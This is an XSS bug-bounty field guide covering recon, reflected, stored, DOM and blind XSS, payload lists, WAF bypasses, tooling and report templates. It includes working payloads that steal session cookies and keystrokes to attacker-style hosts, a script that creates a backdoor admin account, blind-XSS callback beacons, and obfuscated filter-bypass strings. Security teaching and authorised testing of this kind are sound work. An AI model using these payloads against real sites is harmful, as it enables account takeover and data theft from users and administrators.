# 🎯 XSS Hunter — Complete Field Guide

**By Cyberwarlord (Deepak Ghengat)**  
*100+ accepted reports · Hall of Fame: Google · Zoho · TripAdvisor · Adafruit*

> **Authorised testing only. Always have written permission before testing any target.**

---

## Table of Contents

1. [What Is XSS and Why It Matters](#1-what-is-xss)
2. [Finding Injection Points — Recon](#2-recon)
3. [Reflected XSS](#3-reflected-xss)
4. [Stored XSS](#4-stored-xss)
5. [DOM-Based XSS](#5-dom-xss)
6. [Blind XSS](#6-blind-xss)
7. [Payload Library](#7-payloads)
8. [WAF Bypass Techniques](#8-waf-bypass)
9. [Toolchain](#9-tools)
10. [Writing the Report](#10-report)

---

## 1. What Is XSS

XSS fires when user-controlled input reaches the browser without sanitisation, allowing arbitrary JavaScript execution in the victim's context.

### Three Root Causes

```
REFLECTED  — Input echoed in HTTP response without encoding
STORED     — Input saved to database, rendered for other users  
DOM-BASED  — Input written to DOM via JavaScript without sanitisation
```

### Beyond Alert Boxes — Real Impact

Most hunters stop at `alert(1)`. Triage teams do not pay for that. Show impact:

```javascript
// Session hijacking
fetch('https://attacker.com/steal?c=' + document.cookie)

// CSRF token theft → account takeover
fetch('/api/settings', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/?t=' + d.csrf_token))

// Keylogger
document.addEventListener('keypress', e => {
  fetch('https://attacker.com/k?key=' + e.key)
})

// Admin panel → create backdoor admin user
fetch('/admin/users', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({username:'attacker', role:'admin'}),
  credentials: 'include'
})
```

**Rule:** Every XSS report needs a real-world impact statement. Session theft, data exfil, or privilege escalation. Not `alert(1)`.

---

## 2. Recon

### 2.1 Input Surface Map

Every place user input can reach the server or DOM:

```
URL Parameters          ?q=FUZZ&name=FUZZ&id=FUZZ
URL Path Segments       /user/FUZZ/profile
HTTP Headers            User-Agent, Referer, X-Forwarded-For
JSON Request Body       {"name":"FUZZ","bio":"FUZZ"}
Form Fields             All <input>, <textarea>, <select>
File Upload Names       filename="FUZZ.jpg"
WebSocket Messages      Any user-controlled data
URL Fragment            #FUZZ  — client-side only, DOM XSS surface
Custom HTTP Headers     X-Api-Version, X-User-Email
```

### 2.2 URL Collection

```bash
# Collect all historical URLs
waybackurls target.com | tee wayback.txt
gau target.com | tee gau.txt
cat wayback.txt gau.txt | sort -u > all_urls.txt

# Filter only URLs with parameters
cat all_urls.txt | grep "?" | grep -v "\.jpg\|\.png\|\.css\|\.js" > param_urls.txt

# Enumerate parameters with ParamSpider
paramspider -d target.com -o params.txt
```

### 2.3 JavaScript Source Analysis (DOM XSS)

```bash
# Download all JS files from target
wget -r -l 2 -A js https://target.com/ -q

# Find dangerous sinks
grep -rn "innerHTML\|outerHTML\|document\.write\|eval(\|setTimeout(" *.js

# Find user-controlled sources
grep -rn "location\.hash\|location\.search\|document\.referrer\|window\.name\|postMessage" *.js
```

---

## 3. Reflected XSS

### 3.1 Initial Detection

Start with a **probe string** that is visually unique in responses:

```
"><xsstest
```

Inject into every parameter. If it reflects — check the context.

### 3.2 Context Analysis

Context determines payload. This is the most important step.

```html
<!-- CONTEXT 1: Inside HTML attribute with double quotes -->
<input value="INJECT" type="text">
Payload: " onmouseover="alert(1)
Result:  <input value="" onmouseover="alert(1)" type="text">

<!-- CONTEXT 2: Between HTML tags -->
<p>INJECT</p>
Payload: <img src=x onerror=alert(1)>

<!-- CONTEXT 3: Inside JS double-quoted string -->
<script>var x = "INJECT"</script>
Payload: ";alert(1)//
Result:  <script>var x = "";alert(1)//"</script>

<!-- CONTEXT 4: Inside JS single-quoted string -->
<script>var x = 'INJECT'</script>
Payload: ';alert(1)//

<!-- CONTEXT 5: Inside href attribute -->
<a href="INJECT">link</a>
Payload: javascript:alert(1)

<!-- CONTEXT 6: Inside HTML comment -->
<!-- INJECT -->
Payload: --> <script>alert(1)</script> <!--

<!-- CONTEXT 7: Inside style attribute -->
<div style="color:INJECT">
Payload: red" onmouseover="alert(1)
```

### 3.3 Checklist

```
FOR EVERY PARAMETER:
[ ] Does it reflect in the response?
[ ] What context is it in? (attribute / tag / JS string / href)
[ ] Is it HTML encoded? URL encoded? JS escaped?
[ ] Test GET and POST versions
[ ] Test in error messages and headers too
[ ] Try different Content-Type headers
```

---

## 4. Stored XSS

Stored XSS is the most valuable category — persistent, fires for every user who loads the page, highest severity.

### 4.1 Where Stored XSS Lives

```
HIGH-VALUE TARGETS:
User profile fields      name, bio, company, website URL
Comment/review systems   blog comments, product reviews
Support ticket content   subject line and body — seen by admins
In-app messaging         chat, DMs, notifications
File and document names  displayed filenames
Custom fields            anything user-defined shown in UI
Address fields           shipping, billing — shown in order management
Admin notes              anything shown in admin panel
Saved search names       stored filter/query names
Webhook descriptions     user-defined strings in dashboards
```

### 4.2 Admin Panel XSS — Maximum Impact

If your payload fires in an admin's browser:

```javascript
// Extract CSRF token and create backdoor admin
fetch('/admin/settings', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    const csrf = html.match(/csrf_token.*?value="([^"]+)"/)[1];
    return fetch('/admin/users/create', {
      method: 'POST',
      headers: {'X-CSRF-Token': csrf, 'Content-Type': 'application/json'},
      body: JSON.stringify({username: 'pwned', password: 'Pwn3d!', role: 'admin'}),
      credentials: 'include'
    });
  })
```

### 4.3 Test Each Field Systematically

Use **unique markers** per field so you know which one fires:

```
Field: bio    → <img src=x onerror=alert('XSS-BIO')>
Field: name   → <img src=x onerror=alert('XSS-NAME')>
Field: address→ <img src=x onerror=alert('XSS-ADDR')>
```

---

## 5. DOM-Based XSS

DOM XSS never touches the server. Happens entirely in the browser.

### 5.1 Sources → Sinks

```
SOURCES (user-controlled input)    →    SINKS (dangerous functions)
──────────────────────────────          ──────────────────────────
location.hash                     →    innerHTML =
location.search                   →    outerHTML =
location.href                     →    document.write()
document.referrer                 →    eval()
window.name                       →    setTimeout("string")
postMessage event data            →    setInterval("string")
localStorage.getItem()            →    Function()
sessionStorage.getItem()          →    insertAdjacentHTML()
URLSearchParams                   →    location.href =
```

### 5.2 Testing DOM XSS

```javascript
// Hash-based DOM XSS — test these URLs
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/page#"><script>alert(1)</script>
https://target.com/page#javascript:alert(1)

// Vulnerable JS pattern to look for:
var name = location.hash.substring(1);           // SOURCE
document.getElementById('x').innerHTML = name;   // SINK
// → URL: https://target.com/#<img src=x onerror=alert(1)>

// postMessage XSS — look for:
window.addEventListener('message', function(e) {
  document.body.innerHTML = e.data;  // VULNERABLE SINK
});
```

### 5.3 Chrome DevTools Method

```
1. Open DevTools → Sources → Search (Ctrl+Shift+F)
2. Search for: innerHTML, outerHTML, document.write, eval(
3. Click each result and set a breakpoint
4. Reload with payload in URL — trace data flow to sink
```

---

## 6. Blind XSS

Fires in a context you cannot see — admin panels, log viewers, internal tools, email clients.

### 6.1 Setup

Use **XSS Hunter** (free): `https://xsshunter.trufflesecurity.com`

Or run your own callback server:

```python
# Simple blind XSS callback server (save as blind_server.py)
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, datetime

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers()
        p = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        g = lambda k: urllib.parse.unquote(p.get(k, [''])[0])
        print(f"\n🔥 BLIND XSS at {datetime.datetime.now()}")
        print(f"   URL:    {g('url')}")
        print(f"   Cookie: {g('c')}")
        print(f"   Title:  {g('t')}")
    def log_message(self, *a): pass

HTTPServer(('0.0.0.0', 8080), H).serve_forever()
```

### 6.2 Payload

```javascript
// Replace YOUR-SERVER with your IP/domain
<script>
var p={url:location.href,c:document.cookie,t:document.title,r:document.referrer};
new Image().src='http://YOUR-SERVER:8080/?'+new URLSearchParams(p);
</script>

// One-liner version
<img src=x onerror="new Image().src='http://YOUR-SERVER/?c='+document.cookie+'&u='+location.href">
```

### 6.3 Where to Inject Blind XSS

```
HTTP Headers:
  User-Agent         → Analytics dashboards, log viewers
  Referer            → Traffic analysis tools
  X-Forwarded-For    → Admin log viewers

Form Fields:
  Feedback/contact   → Read by staff
  Support tickets    → Read by support agents
  Job applications   → Read by HR admin
  Bug reports        → Read by dev team

User Data:
  Profile bio        → Admin user management panel
  Address fields     → Order management dashboard
  Review text        → Moderation queue
```

**Blind XSS requires patience. Inject and wait. It may fire days later.**

---

## 7. Payloads

### 7.1 Basic Detection — Try These First

```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
"><img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
javascript:alert(1)
```

### 7.2 Filter Bypasses — When Basic Payloads Are Blocked

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- No parentheses — backtick syntax -->
<img src=x onerror=alert`1`>
<svg onload=confirm`1`>

<!-- No spaces -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- alert() keyword filtered -->
<img src=x onerror=confirm(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=window['ale'+'rt'](1)>
<img src=x onerror=Function('alert(1)')()>

<!-- String concatenation -->
";alert(1)//
'-alert(1)-'
`-alert(1)-`

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- HTML entity encoding (sometimes decoded by browser) -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

### 7.3 SVG Vectors

```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><script xlink:href="data:,alert(1)"/>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set attributeName=x onbegin=alert(1)>
```

### 7.4 Polyglots — Work Across Multiple Contexts

```html
'"><img src=x onerror=alert(1)>
</script><script>alert(1)</script>
--></style></script><svg onload=alert(1)>
'"--></style></script><svg/onload=alert(1)>
```

### 7.5 Quick Decision Guide

```
Context              → Payload to try
─────────────────────────────────────────────────
Between HTML tags    → <img src=x onerror=alert(1)>
Inside attribute     → " onmouseover="alert(1)
Inside JS string ""  → ";alert(1)//
Inside JS string ''  → ';alert(1)//
Inside href/src      → javascript:alert(1)
Angular template     → {{constructor.constructor('alert(1)')()}}
```

---

## 8. WAF Bypass

### 8.1 Encoding

```
Original:       <script>alert(1)</script>
URL encoded:    %3Cscript%3Ealert(1)%3C%2Fscript%3E
Double URL:     %253Cscript%253Ealert(1)%253C%252Fscript%253E
HTML entities:  &#60;script&#62;alert(1)&#60;/script&#62;
Hex encoding:   \x3cscript\x3ealert(1)\x3c/script\x3e
```

### 8.2 Request-Level Bypasses

```
1. Change Content-Type: application/x-www-form-urlencoded → multipart/form-data
2. Add null byte:  payload%00
3. Change request method: GET → POST
4. Add junk parameters before the payload parameter
5. Fragment the payload across multiple parameters if concatenated server-side
6. Use chunked transfer encoding
```

### 8.3 JavaScript Obfuscation

```javascript
// Construct function name dynamically
eval('ale'+'rt(1)')
eval(atob('YWxlcnQoMSk='))           // base64 decoded = alert(1)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// Alternative execution
window.onerror = alert; throw 1;
[].constructor.constructor('alert(1)')()
setTimeout`alert\x281\x29`           // template literal + unicode
```

---

## 9. Tools

| Tool | Purpose | Install |
|------|---------|---------|
| **Subfinder** | Subdomain discovery | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| **Httpx** | HTTP probing | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| **Gau** | URL collection | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| **Waybackurls** | Wayback Machine | `go install github.com/tomnomnom/waybackurls@latest` |
| **Dalfox** | XSS scanning | `go install github.com/hahwul/dalfox/v2@latest` |
| **Qsreplace** | Query string replace | `go install github.com/tomnomnom/qsreplace@latest` |
| **Katana** | Web crawler | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
| **ParamSpider** | Parameter discovery | `pip3 install paramspider` |
| **XSS Hunter** | Blind XSS callbacks | https://xsshunter.trufflesecurity.com |
| **DOMInvader** | DOM XSS (Burp ext) | Burp Suite BApp Store |

### One-Command Pipeline

```bash
TARGET=target.com

# Collect → filter → detect reflections → scan
echo $TARGET | subfinder -silent | httpx -silent | \
gau | grep "?" | qsreplace '"><xsstest' | \
httpx -silent -mc 200 -mr '"><xsstest' | \
dalfox pipe --skip-bav -o results.txt
```

---

## 10. Writing the Report

### 10.1 Template

```markdown
## Summary
Stored XSS in user profile bio field allows an attacker to execute arbitrary 
JavaScript in the context of any visitor — including administrators.

## Severity: High
CVSS: 8.8 — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N

## Steps to Reproduce

1. Log in to target.com with any account
2. Go to Profile → Edit → Bio field
3. Enter payload: <img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>
4. Save profile
5. Log in as a different user in a separate browser
6. Visit the attacker's profile page
7. Observe: attacker server receives the victim's session cookie

## Proof of Concept
[Screenshot 1: Payload in bio field]
[Screenshot 2: Victim loading profile]  
[Screenshot 3: Attacker server receiving stolen cookie]

## Impact
An attacker can:
- Steal session cookies of any user who views their profile
- Take over any account including administrators
- Access admin functionality if an administrator is targeted

## Remediation
1. HTML-encode all user output before rendering
2. Implement Content-Security-Policy: script-src 'self'
3. Use DOMPurify for fields requiring HTML
4. Validate and reject HTML in fields that do not require it
```

### 10.2 Severity Escalation Checklist

```
INCREASES SEVERITY:
[ ] Fires without user interaction?
[ ] Fires in admin context?
[ ] Can steal session cookies?         → Show the fetch()
[ ] Can perform CSRF actions?          → Show the request
[ ] Can exfiltrate sensitive data?     → Show what data
[ ] Bypasses existing CSP?             → Document the bypass
[ ] Affects all users not just self?   → Stored > reflected

DECREASES SEVERITY:
[ ] Requires victim to be already authenticated
[ ] Limited to self-XSS only
[ ] Blocked by CSP (with no bypass)
[ ] Requires unusual user interaction
```

### 10.3 Common Rejection Reasons and Fixes

| Rejection Reason | Fix |
|-----------------|-----|
| "Self-XSS only" | Show it can affect other users — stored/reflected not just DOM |
| "No real impact" | Add session theft or CSRF PoC, not just alert(1) |
| "Out of scope" | Check scope more carefully before submitting |
| "Duplicate" | Search the programme's disclosed reports first |
| "Needs more detail" | Add screenshots, exact HTTP requests, step-by-step |

---

## Real Examples From the Field

### Example 1 — Stored XSS in Support Ticket Subject (Critical)

**Target:** B2B SaaS platform  
**Location:** Support ticket subject line displayed in admin helpdesk panel  
**Payload:** `<img src=x onerror=fetch('https://my-server.com/?c='+document.cookie)>`  
**Impact:** Fires when support agent opens ticket — admin cookie stolen  
**Lesson:** Always test what your input looks like to admins, not just other users

---

### Example 2 — DOM XSS via URL Fragment in React App

**Target:** Single-page application  
**Vulnerable code found in JS:**
```javascript
const name = decodeURIComponent(window.location.hash.slice(1));
document.querySelector('#welcome').innerHTML = 'Hi, ' + name;
```
**Exploit URL:** `https://target.com/app#<img src=x onerror=alert(document.domain)>`  
**Lesson:** Read the JavaScript. SPAs have huge DOM XSS surfaces hidden in bundles.

---

### Example 3 — Blind XSS in User-Agent Header

**Target:** E-commerce platform with admin analytics  
**Method:** Sent blind XSS payload in every User-Agent header for 3 days  
**Callback received:** 4 days later — fired in internal analytics dashboard  
**Payload sent:**
```
User-Agent: Mozilla/5.0 <script src="https://my-server.com/xss.js"></script>
```
**Lesson:** Blind XSS is a patience game. Set it and forget it.

---

## Quick Reference Card

```
FIND IT:
  paramspider → waybackurls → filter ?params → inject probe → check reflection

TEST IT:
  Identify context → choose payload → bypass filter → confirm execution

ESCALATE IT:
  alert(1) → cookie theft → account takeover → admin compromise

REPORT IT:
  Summary → Steps → Screenshot PoC → Impact → Remediation
```

---

*Cyberwarlord — Bug Bounty Hunter — Pune, India*  
*Specialisation: XSS · IDOR · SSRF · Business Logic*  
*Hall of Fame: Google · Zoho · TripAdvisor · Adafruit*
